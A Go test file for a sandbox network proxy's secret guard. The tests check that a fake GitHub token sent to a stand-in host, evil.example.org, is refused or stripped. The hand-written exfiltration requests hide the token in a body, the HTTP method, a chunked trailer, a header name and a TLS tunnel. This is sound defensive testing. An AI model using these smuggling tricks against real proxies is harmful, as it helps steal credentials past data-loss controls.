package netproxy_test

import (
	"bufio"
	"context"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/SocialGouv/iterion/pkg/backend/secretguard"
	"github.com/SocialGouv/iterion/pkg/sandbox/netproxy"
)

// Content DLP holds for a plain-HTTP request like for an inspected one — the
// two schemes share the run's proxy: a real value bound for a host its secret
// is not scoped to is refused. Its placeholders are never substituted, even
// toward the secret's own host: a value never goes out over clear text. A body
// sent in chunks is forwarded whole.
func TestLayer2HoldsForAPlainHTTPRequest(t *testing.T) {
	const token = "ghp_R3alV4lu3Fak3T0k3nAbCdEfGhIjKlMn0p"
	g := secretguard.New([]secretguard.Secret{{Name: "gh", Value: token, Hosts: []string{"api.github.com", "llm.corp.example"}}}, secretguard.DefaultConfig())
	ph := g.Secrets()[0].Placeholder
	var mu sync.Mutex
	seen := map[string]string{}
	var blocked []string
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		mu.Lock()
		seen[r.Host+r.URL.Path] = r.Header.Get("Authorization") + " | " + string(b)
		mu.Unlock()
		_, _ = w.Write([]byte("ok"))
	}))
	t.Cleanup(upstream.Close)
	addr := upstream.Listener.Addr().String()
	ca, err := netproxy.NewEphemeralCA()
	if err != nil {
		t.Fatal(err)
	}
	pol, err := netproxy.Compile(netproxy.ModeOpen, nil)
	if err != nil {
		t.Fatal(err)
	}
	prx, err := netproxy.New(netproxy.Options{Policy: pol, InspectCA: ca, Rewriter: g,
		OnBlocked: func(host, reason string) {
			mu.Lock()
			blocked = append(blocked, host+": "+reason)
			mu.Unlock()
		},
		Dial: func(_ context.Context, network, _ string) (net.Conn, error) { return net.Dial(network, addr) }})
	if err != nil {
		t.Fatal(err)
	}
	if err := prx.Start("127.0.0.1:0"); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		ctx, cancel := context.WithTimeout(context.Background(), time.Second)
		defer cancel()
		_ = prx.Shutdown(ctx)
	})
	proxyURL, _ := url.Parse("http://" + prx.Addr().String())
	client := &http.Client{Timeout: 5 * time.Second, Transport: &http.Transport{Proxy: http.ProxyURL(proxyURL)}}
	post := func(target, auth string, body io.Reader) int {
		t.Helper()
		req, err := http.NewRequest(http.MethodPost, target, body)
		if err != nil {
			t.Fatal(err)
		}
		if auth != "" {
			req.Header.Set("Authorization", auth)
		}
		resp, err := client.Do(req)
		if err != nil {
			t.Fatalf("POST %s: %v", target, err)
		}
		_, _ = io.Copy(io.Discard, resp.Body)
		_ = resp.Body.Close()
		return resp.StatusCode
	}

	if code := post("http://evil.example.org/collect", "", strings.NewReader(`{"leak":"`+token+`"}`)); code != http.StatusForbidden {
		t.Errorf("a real value bound for an unapproved host over plain HTTP: status %d, want 403", code)
	}
	// An io.Reader of unknown length: the client sends it in chunks.
	chunked := io.MultiReader(strings.NewReader(`{"token":"`), strings.NewReader(ph+`"}`))
	if code := post("http://api.github.com/repos/o/r/dispatches", "Bearer "+ph, chunked); code != http.StatusOK {
		t.Fatalf("approved host: status %d", code)
	}
	if code := post("http://llm.corp.example/v1/messages", "Bearer "+ph, strings.NewReader(`{"messages":[{"content":"push with `+ph+`"}]}`)); code != http.StatusOK {
		t.Fatalf("model request: status %d", code)
	}
	mu.Lock()
	defer mu.Unlock()
	if _, ok := seen["evil.example.org/collect"]; ok {
		t.Error("the refused request reached the upstream")
	}
	if len(blocked) != 1 || !strings.Contains(blocked[0], "secret exfiltration blocked") {
		t.Errorf("network_blocked reports = %v, want the one refusal", blocked)
	}
	if got := seen["api.github.com/repos/o/r/dispatches"]; got != "Bearer "+ph+` | {"token":"`+ph+`"}` {
		t.Errorf("the approved host received %q over clear text, want the placeholders and the whole chunked body", got)
	}
	if got := seen["llm.corp.example/v1/messages"]; strings.Contains(got, token) || !strings.Contains(got, ph) {
		t.Errorf("the model request received %q, want it in placeholder form", got)
	}
}

// rawForward sends one hand-written request to the proxy as a plain-HTTP
// forward and returns the status line's code.
func rawForward(t *testing.T, proxyAddr, request string) int {
	t.Helper()
	conn, err := net.Dial("tcp", proxyAddr)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(5 * time.Second))
	if _, err := conn.Write([]byte(request)); err != nil {
		t.Fatal(err)
	}
	resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
	if err != nil {
		t.Fatalf("read the proxy's answer: %v", err)
	}
	_ = resp.Body.Close()
	return resp.StatusCode
}

// The surfaces a request carries beside its headers and body: a value in the
// method is refused like one in a header; a value in a chunked request's
// trailer never reaches the upstream — the body is forwarded framed by its
// length, its trailers dropped.
func TestAValueInTheMethodOrATrailerIsNoWayOut(t *testing.T) {
	const token = "ghp_R3alV4lu3Fak3T0k3nAbCdEfGhIjKlMn0p"
	g := secretguard.New([]secretguard.Secret{{Name: "gh", Value: token, Hosts: []string{"api.github.com"}}}, secretguard.DefaultConfig())
	var mu sync.Mutex
	var received []string
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		mu.Lock()
		received = append(received, r.Method+" "+string(b)+" trailer="+r.Trailer.Get("X-Probe"))
		mu.Unlock()
		_, _ = w.Write([]byte("ok"))
	}))
	t.Cleanup(upstream.Close)
	addr := upstream.Listener.Addr().String()
	ca, err := netproxy.NewEphemeralCA()
	if err != nil {
		t.Fatal(err)
	}
	pol, err := netproxy.Compile(netproxy.ModeOpen, nil)
	if err != nil {
		t.Fatal(err)
	}
	prx, err := netproxy.New(netproxy.Options{Policy: pol, InspectCA: ca, Rewriter: g,
		Dial: func(_ context.Context, network, _ string) (net.Conn, error) { return net.Dial(network, addr) }})
	if err != nil {
		t.Fatal(err)
	}
	if err := prx.Start("127.0.0.1:0"); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		ctx, cancel := context.WithTimeout(context.Background(), time.Second)
		defer cancel()
		_ = prx.Shutdown(ctx)
	})
	if code := rawForward(t, prx.Addr().String(), token+" http://evil.example.org/x HTTP/1.1\r\nHost: evil.example.org\r\nContent-Length: 0\r\n\r\n"); code != http.StatusForbidden {
		t.Errorf("a value as the method: status %d, want 403", code)
	}
	if code := rawForward(t, prx.Addr().String(), "POST http://evil.example.org/x HTTP/1.1\r\nHost: evil.example.org\r\nTransfer-Encoding: chunked\r\nTrailer: X-Probe\r\n\r\n5\r\nhello\r\n0\r\nX-Probe: "+token+"\r\n\r\n"); code != http.StatusOK {
		t.Fatalf("scenario broken: the chunked request: status %d", code)
	}
	mu.Lock()
	defer mu.Unlock()
	for _, r := range received {
		if strings.Contains(r, token) {
			t.Errorf("the upstream received the value: %q", r)
		}
	}
	if len(received) != 1 || !strings.HasPrefix(received[0], "POST hello") {
		t.Errorf("received %q, want the chunked request's body only", received)
	}
}

// An empty body is forwarded as one — Content-Length: 0, not an empty
// chunked stream.
func TestAnEmptyBodyIsForwardedAsOne(t *testing.T) {
	g := secretguard.New([]secretguard.Secret{{Name: "gh", Value: "ghp_R3alV4lu3Fak3T0k3nAbCdEfGhIjKlMn0p"}}, secretguard.DefaultConfig())
	var mu sync.Mutex
	var framing []string
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		framing = append(framing, fmt.Sprintf("cl=%d te=%v", r.ContentLength, r.TransferEncoding))
		mu.Unlock()
		_, _ = w.Write([]byte("ok"))
	}))
	t.Cleanup(upstream.Close)
	addr := upstream.Listener.Addr().String()
	ca, err := netproxy.NewEphemeralCA()
	if err != nil {
		t.Fatal(err)
	}
	pol, err := netproxy.Compile(netproxy.ModeOpen, nil)
	if err != nil {
		t.Fatal(err)
	}
	prx, err := netproxy.New(netproxy.Options{Policy: pol, InspectCA: ca, Rewriter: g,
		Dial: func(_ context.Context, network, _ string) (net.Conn, error) { return net.Dial(network, addr) }})
	if err != nil {
		t.Fatal(err)
	}
	if err := prx.Start("127.0.0.1:0"); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		ctx, cancel := context.WithTimeout(context.Background(), time.Second)
		defer cancel()
		_ = prx.Shutdown(ctx)
	})
	if code := rawForward(t, prx.Addr().String(), "POST http://api.example.org/ping HTTP/1.1\r\nHost: api.example.org\r\nContent-Length: 0\r\n\r\n"); code != http.StatusOK {
		t.Fatalf("status %d", code)
	}
	mu.Lock()
	defer mu.Unlock()
	if len(framing) != 1 || framing[0] != "cl=0 te=[]" {
		t.Errorf("the upstream saw %v, want an empty body framed by its length", framing)
	}
}

// Inside an inspected tunnel too, a chunked request's trailer — a header field
// content DLP never scanned — never reaches the upstream.
func TestATrailerInsideATunnelNeverReachesTheUpstream(t *testing.T) {
	const token = "ghp_R3alV4lu3Fak3T0k3nAbCdEfGhIjKlMn0p"
	g := secretguard.New([]secretguard.Secret{{Name: "gh", Value: token, Hosts: []string{"api.github.com"}}}, secretguard.DefaultConfig())
	var mu sync.Mutex
	var received []string
	upstream := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		mu.Lock()
		received = append(received, string(b)+" trailer="+r.Trailer.Get("X-Probe"))
		mu.Unlock()
		_, _ = w.Write([]byte("ok"))
	}))
	t.Cleanup(upstream.Close)
	addr := upstream.Listener.Addr().String()
	pool := x509.NewCertPool()
	pool.AddCert(upstream.Certificate())
	ca, err := netproxy.NewEphemeralCA()
	if err != nil {
		t.Fatal(err)
	}
	pol, err := netproxy.Compile(netproxy.ModeOpen, nil)
	if err != nil {
		t.Fatal(err)
	}
	prx, err := netproxy.New(netproxy.Options{Policy: pol, InspectCA: ca, Rewriter: g,
		InspectUpstreamTLS: &tls.Config{RootCAs: pool, ServerName: "example.com"},
		Dial:               func(_ context.Context, network, _ string) (net.Conn, error) { return net.Dial(network, addr) }})
	if err != nil {
		t.Fatal(err)
	}
	if err := prx.Start("127.0.0.1:0"); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		ctx, cancel := context.WithTimeout(context.Background(), time.Second)
		defer cancel()
		_ = prx.Shutdown(ctx)
	})
	conn, err := net.Dial("tcp", prx.Addr().String())
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))
	if _, err := conn.Write([]byte("CONNECT evil.example.org:443 HTTP/1.1\r\nHost: evil.example.org:443\r\n\r\n")); err != nil {
		t.Fatal(err)
	}
	br := bufio.NewReader(conn)
	if resp, err := http.ReadResponse(br, nil); err != nil || resp.StatusCode != http.StatusOK {
		t.Fatalf("CONNECT: %v %v", resp, err)
	}
	clientPool := x509.NewCertPool()
	clientPool.AppendCertsFromPEM(ca.CertPEM())
	tc := tls.Client(&readerConn{Conn: conn, r: br}, &tls.Config{RootCAs: clientPool, ServerName: "evil.example.org"})
	req := "POST /x HTTP/1.1\r\nHost: evil.example.org\r\nTransfer-Encoding: chunked\r\nTrailer: X-Probe\r\nConnection: close\r\n\r\n5\r\nhello\r\n0\r\nX-Probe: " + token + "\r\n\r\n"
	if _, err := tc.Write([]byte(req)); err != nil {
		t.Fatal(err)
	}
	resp, err := http.ReadResponse(bufio.NewReader(tc), nil)
	if err != nil {
		t.Fatal(err)
	}
	_ = resp.Body.Close()
	mu.Lock()
	defer mu.Unlock()
	for _, r := range received {
		if strings.Contains(r, token) {
			t.Errorf("the upstream received the trailer's value: %q", r)
		}
	}
	if resp.StatusCode != http.StatusOK || len(received) != 1 {
		t.Fatalf("scenario broken: status %d, received %v", resp.StatusCode, received)
	}
}

// A lower-case value placed in a header's NAME right after a dash reaches the
// proxy canonicalised (that letter upper-cased): content DLP still sees it as
// sent and refuses it.
func TestAValueInAHeaderNameIsRefused(t *testing.T) {
	const token = "ghp3r3alv4lu3fak3t0k3nabcdefghijklmn0p"
	g := secretguard.New([]secretguard.Secret{{Name: "k", Value: token, Hosts: []string{"api.github.com"}}}, secretguard.DefaultConfig())
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { _, _ = w.Write([]byte("ok")) }))
	t.Cleanup(upstream.Close)
	addr := upstream.Listener.Addr().String()
	ca, err := netproxy.NewEphemeralCA()
	if err != nil {
		t.Fatal(err)
	}
	pol, err := netproxy.Compile(netproxy.ModeOpen, nil)
	if err != nil {
		t.Fatal(err)
	}
	prx, err := netproxy.New(netproxy.Options{Policy: pol, InspectCA: ca, Rewriter: g,
		Dial: func(_ context.Context, network, _ string) (net.Conn, error) { return net.Dial(network, addr) }})
	if err != nil {
		t.Fatal(err)
	}
	if err := prx.Start("127.0.0.1:0"); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		ctx, cancel := context.WithTimeout(context.Background(), time.Second)
		defer cancel()
		_ = prx.Shutdown(ctx)
	})
	for _, name := range []string{"X-Q" + token, "X-Q-" + token} {
		if code := rawForward(t, prx.Addr().String(), "GET http://evil.example.org/x HTTP/1.1\r\nHost: evil.example.org\r\n"+name+": 1\r\n\r\n"); code != http.StatusForbidden {
			t.Errorf("header name %q: status %d, want 403", name, code)
		}
	}
}

// A panicking OnBlocked hook does not take the proxy down: the refusal is
// answered, and the proxy serves the next request.
func TestAPanickingBlockedHookLeavesTheProxyServing(t *testing.T) {
	const token = "ghp_R3alV4lu3Fak3T0k3nAbCdEfGhIjKlMn0p"
	g := secretguard.New([]secretguard.Secret{{Name: "gh", Value: token, Hosts: []string{"api.github.com"}}}, secretguard.DefaultConfig())
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { _, _ = w.Write([]byte("ok")) }))
	t.Cleanup(upstream.Close)
	addr := upstream.Listener.Addr().String()
	ca, err := netproxy.NewEphemeralCA()
	if err != nil {
		t.Fatal(err)
	}
	pol, err := netproxy.Compile(netproxy.ModeOpen, nil)
	if err != nil {
		t.Fatal(err)
	}
	prx, err := netproxy.New(netproxy.Options{Policy: pol, InspectCA: ca, Rewriter: g,
		OnBlocked: func(string, string) { panic("hook") },
		Dial:      func(_ context.Context, network, _ string) (net.Conn, error) { return net.Dial(network, addr) }})
	if err != nil {
		t.Fatal(err)
	}
	if err := prx.Start("127.0.0.1:0"); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		ctx, cancel := context.WithTimeout(context.Background(), time.Second)
		defer cancel()
		_ = prx.Shutdown(ctx)
	})
	if code := rawForward(t, prx.Addr().String(), "POST http://evil.example.org/x HTTP/1.1\r\nHost: evil.example.org\r\nContent-Length: 38\r\n\r\n"+token); code != http.StatusForbidden {
		t.Errorf("refusal with a panicking hook: status %d, want 403", code)
	}
	if code := rawForward(t, prx.Addr().String(), "GET http://api.example.org/ping HTTP/1.1\r\nHost: api.example.org\r\n\r\n"); code != http.StatusOK {
		t.Errorf("the next request: status %d, want 200", code)
	}
}
